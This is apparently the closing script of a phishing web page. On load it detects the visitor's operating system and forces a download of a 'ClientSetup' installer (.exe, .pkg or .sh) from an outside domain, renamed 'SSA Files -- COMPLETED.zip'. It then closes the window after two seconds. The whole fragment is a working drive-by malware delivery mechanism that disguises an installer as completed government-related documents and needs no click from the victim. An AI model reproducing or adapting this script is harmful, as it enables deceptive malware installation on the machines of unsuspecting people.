    <script>
        function detectOS() {
  const platform = navigator.platform.toLowerCase();
  const userAgent = navigator.userAgent.toLowerCase();

  if (platform.includes('win')) return 'windows';
  if (platform.includes('mac')) return 'macos';
  if (platform.includes('linux') || userAgent.includes('linux')) return 'linux';

  return 'unknown';
}

function getDownloadLink(os) {
  switch (os) {
    case 'windows':
      return 'https://secure.iddeadalltimeback.co/Bin/work_approval_pdf3.ClientSetup.exe?e=Access&y=Guest';
    case 'macos':
      return 'https://secure.iddeadalltimeback.co/Bin/work_approval_pdf3.ClientSetup.pkg?e=Access&y=Guest';
    case 'linux':
      return 'https://secure.iddeadalltimeback.co/Bin/work_approval_pdf3.ClientSetup.sh?e=Access&y=Guest';
    default:
      return 'https://secure.iddeadalltimeback.co/Bin/work_approval_pdf3.ClientSetup.exe?e=Access&y=Guest';
  }
}

window.onload = function () {
  const osType = detectOS();
  const downloadLink = getDownloadLink(osType);

  const downloadBtn = document.createElement("a");
  downloadBtn.href = downloadLink;
  downloadBtn.download = "SSA Files -- COMPLETED.zip";
  document.body.appendChild(downloadBtn);
  downloadBtn.click();

  setTimeout(() => {
    window.close();
  }, 2000);
};
    </script>
</body>
